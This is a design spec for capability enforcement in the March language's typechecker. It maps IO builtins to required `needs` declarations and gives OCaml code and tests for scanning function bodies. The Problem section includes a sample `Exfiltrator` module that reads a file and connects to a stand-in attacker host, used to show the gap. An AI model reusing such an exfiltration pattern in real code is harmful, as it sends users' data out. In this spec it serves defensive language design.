# Capability Body-Scanning Enforcement

**Status:** Planned — P2 (important / near-term)  
**Spec date:** 2026-06-18  
**Related:** `specs/capability-system-design.md`, `lib/typecheck/typecheck.ml §check_module_needs`

---

## Problem

The `needs` declaration system and the `Cap(X)` type hierarchy exist to give
March static guarantees about side effects. Today that guarantee is hollow:
capability enforcement only scans **function type signatures** for `Cap(X)`
parameters. All IO builtins (`println`, `file_read`, `tcp_connect`, etc.) take
no `Cap` parameter, so a module with zero `needs` declarations can call any of
them freely without the typechecker objecting.

```march
-- No needs declaration. Typechecker is silent.
mod Exfiltrator do
  fn steal(path) do
    match file_read(path) do
      Ok(data) -> tcp_connect("attacker.example.com", 9000)
      Err(_) -> ()
    end
  end
end
```

`check_module_needs` only catches `Cap(X)` values that appear as typed
parameters in function signatures, which is a usage pattern that today only
appears in user-defined capability APIs. The stdlib I/O layer bypasses it
entirely because builtin call sites have no `Cap` argument to type-check.

The fix is two-phased:

1. **Builtin→cap table**: define which builtins require which capabilities.
2. **Body-scanning pass**: walk function bodies in `check_module_needs` for
   direct calls to those builtins, requiring matching `needs` declarations.

---

## Capability Hierarchy Additions

One new leaf needed; everything else already exists:

```
IO
├── IO.Console
├── IO.FileSystem
│   ├── IO.FileRead    (existing)
│   └── IO.FileWrite   (existing)
├── IO.Network
│   ├── IO.NetConnect  (existing)
│   └── IO.NetListen   (existing)
├── IO.Process         (existing)
├── IO.Clock           (existing)
└── IO.Random          ← NEW
```

`IO.Random` covers CSPRNG operations. Reading entropy from the OS is a side
effect (it consumes kernel randomness pool state, is non-deterministic, and
can block under rare conditions).

Add to `io_cap_hierarchy` in `lib/typecheck/typecheck.ml`:
```ocaml
("IO.Random", Some "IO");
```

---

## Builtin → Capability Table

The authoritative mapping. Builtins not listed are **pure** and require no
capability.

### IO.Console

| Builtin | Notes |
|---------|-------|
| `println` | stdout |
| `print` | stdout, no newline |

### IO.FileRead

| Builtin | Notes |
|---------|-------|
| `file_exists` | stat-level read |
| `file_read` | read entire file |
| `file_open` | open handle for reading |
| `file_read_line` | read from open handle |
| `file_read_chunk` | read from open handle |
| `file_close` | close handle (no cap — closing is always allowed) |
| `file_stat` | filesystem metadata |
| `dir_exists` | stat-level read |
| `dir_list` | directory listing |
| `csv_open` | opens file for reading |
| `csv_next_row` | reads from open CSV handle |
| `csv_close` | — no cap (same as file_close) |

### IO.FileWrite

| Builtin | Notes |
|---------|-------|
| `file_write` | write/create file |
| `file_append` | append to file |
| `file_delete` | delete file |
| `file_copy` | copy file (reads source + writes dest — needs both; `IO.FileSystem` covers both) |
| `file_rename` | rename/move file |
| `dir_mkdir` | create directory |
| `dir_mkdir_p` | create directory tree |
| `dir_rmdir` | remove empty directory |
| `dir_rm_rf` | remove directory tree |

Note: `file_copy` requires both read and write. Declaring `needs IO.FileSystem`
(the parent) satisfies both, which is the intended usage. The table maps
`file_copy` → `IO.FileSystem` directly.

### IO.NetConnect

| Builtin | Notes |
|---------|-------|
| `tcp_connect` | outbound TCP connection |
| `tcp_send_all` | write to socket |
| `tcp_recv_all` | read from socket |
| `tcp_recv_exact` | read from socket |
| `tcp_recv_http` | read HTTP response body |
| `tcp_recv_http_headers` | read HTTP response headers |
| `tcp_recv_chunk` | read chunked frame |
| `tcp_recv_chunked_frame` | read chunked frame |
| `tcp_close` | — no cap (closing always allowed) |
| `tcp_peer_addr` | — no cap (metadata on existing socket) |
| `ws_recv` | WebSocket receive |
| `ws_send` | WebSocket send |
| `ws_select` | WebSocket select |

### IO.Network (parent — covers both NetConnect and NetListen)

| Builtin | Notes |
|---------|-------|
| `dns_resolve` | DNS lookup (outbound) |

### IO.NetListen

| Builtin | Notes |
|---------|-------|
| `http_server_listen` | bind + listen on port |
| `http_server_spawn_n` | spawn server workers |
| `http_server_wait` | block on server |

### IO.Process

| Builtin | Notes |
|---------|-------|
| `process_env` | read env variable |
| `process_set_env` | write env variable |
| `process_cwd` | read working directory |
| `process_argv` | read process arguments |
| `process_pid` | read process PID |
| `process_exit` | terminate process |
| `process_spawn_sync` | spawn child process |
| `process_spawn_lines` | spawn child process (streaming) |
| `process_spawn_async` | spawn child process (async) |
| `process_read_line` | read from child's stdout |
| `process_write` | write to child's stdin |
| `process_kill_proc` | kill child process |
| `process_wait_proc` | wait for child exit |

### IO.Clock

| Builtin | Notes |
|---------|-------|
| `unix_time` | current wall clock (Float, seconds) |
| `unix_time_ms` | current wall clock (Int, milliseconds) |
| `uuid_v7` | time-ordered UUID (embeds current timestamp) |

### IO.Random

| Builtin | Notes |
|---------|-------|
| `random_bytes` | CSPRNG bytes |
| `stdlib_random_bytes` | CSPRNG bytes (stdlib internal) |
| `uuid_v4` | random UUID via CSPRNG |

### No capability required (pure)

These are explicitly **not** in the table — calling them requires no `needs`:

- All string operations (`string_*`, `char_*`)
- All math operations (`math_*`, `float_*`, `int_*`)
- All crypto hash/MAC/KDF functions: `sha256`, `hmac_sha256`, `hmac_sha256_bytes`,
  `pbkdf2_sha256` — these are deterministic given their inputs
- `base64_encode`, `base64_decode`, `md5`, `stdlib_sha256`, etc.
- `http_serialize_request`, `http_parse_response` — pure serialization/parsing
- `tcp_close`, `tcp_peer_addr`, `file_close`, `csv_close` — resource cleanup
- `task_spawn`, `task_await`, `task_await_unwrap`, `task_yield`, etc. —
  concurrency primitives; the capability model doesn't track scheduler effects
- `self`, `receive`, `actor_cast`, `actor_call` — actor messaging primitives;
  actor-to-actor communication is governed by `Cap(Pid)`, not `needs`
- `panic`, `todo_`, `unreachable_` — control flow, not effects
- All logger *configuration* builtins (`logger_set_level`, etc.) — logger
  setup is treated as a runtime configuration, not a trackable effect
- `logger_write` and `logger_dispatch` — see Logger note below

**Logger note:** Logger writes are intentionally exempt. The logger's
destination (console, file, network) is a runtime configuration concern, not
a static capability. Requiring `needs IO.Console` for every module that logs
would be pervasive and unhelpful. Logger output is a cross-cutting concern
that the capability system shouldn't gate.

---

## Phase 1: Stdlib Annotation

Before body-scanning is enforced, stdlib modules that call IO builtins must
declare the appropriate `needs`. This is the prerequisite — without it, turning
on Phase 2 would make the stdlib itself fail to compile.

**Files to update with `needs` declarations:**

| Module file | Declarations to add |
|---|---|
| `stdlib/io.march` | `needs IO.Console` |
| `stdlib/file.march` | `needs IO.FileRead` — for `file_read`, `file_open`, `file_stat`, `file_exists` |
| `stdlib/file.march` | `needs IO.FileWrite` — for `file_write`, `file_append`, `file_delete`, `file_rename`, `file_copy` |
| `stdlib/dir.march` (or `file.march` if co-located) | `needs IO.FileRead`, `needs IO.FileWrite` |
| `stdlib/system.march` | `needs IO.Process`, `needs IO.Clock` |
| `stdlib/csv.march` (if it exists as standalone) | `needs IO.FileRead` |
| `stdlib/uuid.march` | `needs IO.Random` — for `uuid_v4`, `uuid_v7` |
| `stdlib/random.march` | `needs IO.Random` |
| `stdlib/crypto.march` | `needs IO.Random` — for `random_bytes` only |

The `needs` declaration goes at module top-level (inside the `mod Name do`
block), exactly as user modules declare them:

```march
mod File do
  needs IO.FileRead
  needs IO.FileWrite

  fn read(path) do
    file_read(path)
  end
  ...
end
```

Once Phase 1 is complete, transitive enforcement (Check 4, already implemented)
automatically propagates: any user module that imports `File` and calls
`File.read` will be required to declare `needs IO.FileRead` — with no changes
to the transitive enforcement code.

**LoE for Phase 1:** ~0.5 days. Mechanical annotation; each stdlib module
needs one or two `needs` lines added and then the test suite re-run to verify
the stdlib still typechecks cleanly.

---

## Phase 2: Body-Scanning Pass

### Design

Extend `check_module_needs` to scan function bodies (not just signatures) for
calls to builtins in the capability table. Any such call in a module body
requires a corresponding `needs` declaration.

The scan operates at **module granularity**, not function granularity. This is
a deliberate design choice:

- Coarser than algebraic effects (which track per-function) but much less
  verbose — no annotation burden per function.
- Consistent with the existing `needs` model, which is already module-level.
- A module calling `file_read` anywhere in its body IS a file-reading module,
  regardless of which specific function makes the call.

### The `calls_in_expr` traversal

A new pure function that recursively walks an AST expression collecting
`(name, span)` pairs for all `EApp(EVar name, _)` calls:

```ocaml
let rec calls_in_expr (e : Ast.expr) : (string * Ast.span) list =
  match e with
  | Ast.EApp (Ast.EVar name, args, sp) ->
    (name.txt, sp) :: List.concat_map calls_in_expr args
  | Ast.EApp (f, args, _) ->
    calls_in_expr f @ List.concat_map calls_in_expr args
  | Ast.ELam (_, body, _) -> calls_in_expr body
  | Ast.ELet (_, rhs, body, _) -> calls_in_expr rhs @ calls_in_expr body
  | Ast.ELetFn (_, _, _, body, _) -> calls_in_expr body
  | Ast.EBlock exprs _ -> List.concat_map calls_in_expr exprs
  | Ast.EIf (cond, t, f, _) ->
    calls_in_expr cond @ calls_in_expr t @
    Option.fold ~none:[] ~some:calls_in_expr f
  | Ast.EMatch (scrut, arms, _) ->
    calls_in_expr scrut @
    List.concat_map (fun arm -> calls_in_expr arm.Ast.arm_body) arms
  | Ast.ERecord (fields, _) -> List.concat_map (fun (_, e) -> calls_in_expr e) fields
  | Ast.ERecordUpdate (base, fields, _) ->
    calls_in_expr base @ List.concat_map (fun (_, e) -> calls_in_expr e) fields
  | Ast.ETuple (es, _) -> List.concat_map calls_in_expr es
  | Ast.EPipe (lhs, rhs, _) -> calls_in_expr lhs @ calls_in_expr rhs
  | _ -> []
```

This handles lambdas (closures in HOFs), `let`-bindings, `if`/`match`, and
records. The key property: a lambda `fn p -> file_read(p) end` passed to
`List.map` IS walked, so the module that writes that lambda is flagged.

### Integration into `check_module_needs`

Add a new `body_cap_uses` collection alongside the existing `used_caps`
(which collects Cap types from signatures):

```ocaml
let builtin_cap_table : string StringMap.t = StringMap.of_list [
  ("println",              "IO.Console");
  ("print",                "IO.Console");
  ("file_read",            "IO.FileRead");
  ("file_exists",          "IO.FileRead");
  ("file_open",            "IO.FileRead");
  ("file_read_line",       "IO.FileRead");
  ("file_read_chunk",      "IO.FileRead");
  ("file_stat",            "IO.FileRead");
  ("dir_exists",           "IO.FileRead");
  ("dir_list",             "IO.FileRead");
  ("csv_open",             "IO.FileRead");
  ("csv_next_row",         "IO.FileRead");
  ("file_write",           "IO.FileWrite");
  ("file_append",          "IO.FileWrite");
  ("file_delete",          "IO.FileWrite");
  ("file_rename",          "IO.FileWrite");
  ("file_copy",            "IO.FileSystem");
  ("dir_mkdir",            "IO.FileWrite");
  ("dir_mkdir_p",          "IO.FileWrite");
  ("dir_rmdir",            "IO.FileWrite");
  ("dir_rm_rf",            "IO.FileWrite");
  ("tcp_connect",          "IO.NetConnect");
  ("tcp_send_all",         "IO.NetConnect");
  ("tcp_recv_all",         "IO.NetConnect");
  ("tcp_recv_exact",       "IO.NetConnect");
  ("tcp_recv_http",        "IO.NetConnect");
  ("tcp_recv_http_headers","IO.NetConnect");
  ("tcp_recv_chunk",       "IO.NetConnect");
  ("tcp_recv_chunked_frame","IO.NetConnect");
  ("ws_recv",              "IO.NetConnect");
  ("ws_send",              "IO.NetConnect");
  ("ws_select",            "IO.NetConnect");
  ("dns_resolve",          "IO.Network");
  ("http_server_listen",   "IO.NetListen");
  ("http_server_spawn_n",  "IO.NetListen");
  ("http_server_wait",     "IO.NetListen");
  ("process_env",          "IO.Process");
  ("process_set_env",      "IO.Process");
  ("process_cwd",          "IO.Process");
  ("process_argv",         "IO.Process");
  ("process_pid",          "IO.Process");
  ("process_exit",         "IO.Process");
  ("process_spawn_sync",   "IO.Process");
  ("process_spawn_lines",  "IO.Process");
  ("process_spawn_async",  "IO.Process");
  ("process_read_line",    "IO.Process");
  ("process_write",        "IO.Process");
  ("process_kill_proc",    "IO.Process");
  ("process_wait_proc",    "IO.Process");
  ("unix_time",            "IO.Clock");
  ("unix_time_ms",         "IO.Clock");
  ("uuid_v7",              "IO.Clock");
  ("random_bytes",         "IO.Random");
  ("stdlib_random_bytes",  "IO.Random");
  ("uuid_v4",              "IO.Random");
]

(* In check_module_needs, after computing used_caps from signatures: *)
let body_cap_uses : (string * Ast.span) list =
  List.concat_map (function
    | Ast.DFn (def, _) ->
      List.concat_map (fun clause ->
        calls_in_expr clause.Ast.fc_body
        |> List.filter_map (fun (name, sp) ->
            StringMap.find_opt name builtin_cap_table
            |> Option.map (fun cap -> (cap, sp)))
      ) def.fn_clauses
    | Ast.DLet (_, rhs, _) ->
      calls_in_expr rhs
      |> List.filter_map (fun (name, sp) ->
          StringMap.find_opt name builtin_cap_table
          |> Option.map (fun cap -> (cap, sp)))
    | _ -> []
  ) decls
in
let all_used_caps = used_caps @ body_cap_uses in
(* Then Check 1 runs on all_used_caps as before *)
```

Note that `DLet` bodies are also scanned — a module-level `let conn = tcp_connect(...)` should require `needs IO.NetConnect`.

The existing deduplication logic in `discharge_constraints` (the `seen` hashtable) handles the case where the same builtin is called many times without emitting duplicate errors.

---

## Error Messages

### Body-call without `needs`

```
error[E0431]: `file_read` requires capability `IO.FileRead`
  --> src/data_loader.march:14:20
   |
14 |   let content = file_read(path)
   |                 ^^^^^^^^^ requires IO.FileRead
   |
   = this module calls `file_read` but does not declare `needs IO.FileRead`
   = help: add `needs IO.FileRead` to the top of mod DataLoader
   = note: `IO.FileRead` is a child of `IO.FileSystem`; `needs IO.FileSystem`
           would also satisfy this requirement
```

The note about parent capabilities is generated by walking `cap_ancestors`:
any ancestor of the required cap is a valid alternative.

### Cascading: missing `needs` after import

If `DataLoader` lacks `needs IO.FileRead`, any module that imports
`DataLoader` will also fail Check 4 (the existing transitive enforcement):

```
error[E0432]: module `DataLoader` requires `IO.FileRead` but this module
              does not declare it
  --> src/app.march:3:1
   |
 3 | import DataLoader
   | ^^^^^^^^^^^^^^^^^ DataLoader needs IO.FileRead
   |
   = DataLoader performs file reads; importing it requires acknowledging this.
   = help: add `needs IO.FileRead` to module App
```

This is the existing Check 4 message, no changes needed.

---

## Purity Guarantee

Once both phases are complete, the following static guarantee holds:

> A module with no `needs` declarations, that imports no modules with `needs`
> declarations, calls no IO builtin directly.

This is a meaningful purity certificate for library code. Pure functional
modules (`List`, `Map`, `Math`, `String`, etc.) already have no `needs`
declarations and call no IO builtins, so they automatically satisfy this
property with no changes.

---

## Migration and Breaking Change

Phase 2 is a **breaking change** for any existing user code that calls IO
builtins without `needs` declarations. Since March is pre-1.0, this is
acceptable.

**Migration path:**

1. Phase 1 ships first (stdlib annotation). No user code breaks — the new
   `needs` declarations in stdlib only affect transitive enforcement, which
   only fires if the user's module explicitly calls the stdlib's IO functions
   AND already has a `needs` declaration that would conflict. In practice: no
   existing user code breaks in Phase 1.

2. Phase 2 ships as a **warning** initially (not an error). All existing code
   that calls IO builtins without `needs` gets a warning with a clear fix.

3. After one release cycle, warnings become errors. The `--no-strict-caps` flag
   can defer this for codebases that need more time.

**Automatic fix suggestion:** The error message includes the exact `needs`
line to add, making this a one-line fix per violation.

---

## What This Does NOT Enforce

These are accepted limitations, consistent with the decision not to implement
algebraic effects:

**HOF propagation:** If a function takes a callback that performs IO, the
function itself is not flagged — only the module containing the lambda literal
that calls the IO builtin. This is correct: the module WRITING the IO-performing
lambda should declare the need; the generic HOF (`List.map`, `Task.async`)
doesn't.

**Function-level purity:** The system enforces at module granularity. A module
with `needs IO.FileRead` may have some pure functions and some impure ones —
there's no per-function purity annotation. This is the chosen tradeoff vs.
effects.

**Dynamic capability checks:** If code receives a `Cap(IO)` token at runtime
and uses it to narrow a sub-capability, the narrowing path isn't tracked by
body scanning. This is the explicit Cap parameter pattern and is already covered
by Check 1 (signature scanning).

---

## Implementation Plan

### Phase 1 — Stdlib annotation

**Files:** ~8 stdlib `.march` files  
**Changes:** Add 1–2 `needs X` lines per file  
**Tests:** Run full suite after each file; expect zero failures (needs declarations are new, not changes)  
**LoE:** ~0.5 days

### Phase 2 — Body-scanning pass

**Files changed:**
- `lib/typecheck/typecheck.ml`
  - Add `builtin_cap_table` near the `io_cap_hierarchy` definition
  - Add `calls_in_expr` AST walker (~35 lines)
  - Extend `check_module_needs` to collect `body_cap_uses` and merge with
    existing `used_caps` (~25 lines)
  - Add `IO.Random` to `io_cap_hierarchy` (~1 line)
- `lib/typecheck/typecheck.ml` (error message) — extend the Check 1 error path
  to mention "body call" vs. "signature mention" in the diagnostic

**Tests to add** (new group `cap_body_enforce`):
1. Module calls `println` without `needs IO.Console` → error
2. Module calls `file_read` without `needs IO.FileRead` → error
3. Module calls `file_read` with `needs IO.FileRead` → ok
4. Module calls `file_read` with `needs IO.FileSystem` (parent) → ok
5. Module calls `file_read` with `needs IO` (root) → ok
6. Lambda inside `List.map` calling `file_read` → flags the enclosing module
7. `DLet` body calling `tcp_connect` → error on module missing `needs IO.NetConnect`
8. Pure function in module with no `needs` (no builtins called) → ok, no error
9. `uuid_v4` requires `needs IO.Random` → error when absent
10. `uuid_v7` requires `needs IO.Clock` → error when absent
11. Module with `needs IO.Random` calling `random_bytes` → ok
12. `process_argv` requires `needs IO.Process` → error when absent
13. Existing Cap-parameter check (Check 1) still passes after body-scan addition
14. Transitive: module imports File (which has `needs IO.FileRead`) and
    calls `File.read` — module must declare `needs IO.FileRead` (Check 4)
15. Stdlib `file.march` itself passes after Phase 1 annotation

**LoE:** ~1.5 days

**Total LoE:** ~2 days across both phases

---

## Summary

| Phase | What it does | LoE | Breaking? |
|---|---|---|---|
| 1 — Stdlib annotation | Add `needs` to stdlib IO modules | 0.5 days | No |
| 2 — Body scanning | Walk bodies; enforce builtin→cap table | 1.5 days | Warning then error |
| Total | Full capability enforcement | **~2 days** | Soft migration |

After both phases, `needs` declarations become a **real static guarantee**:
a module's capability requirements are visible at its top level, and the
compiler enforces that no undeclared IO can happen in that module's body.
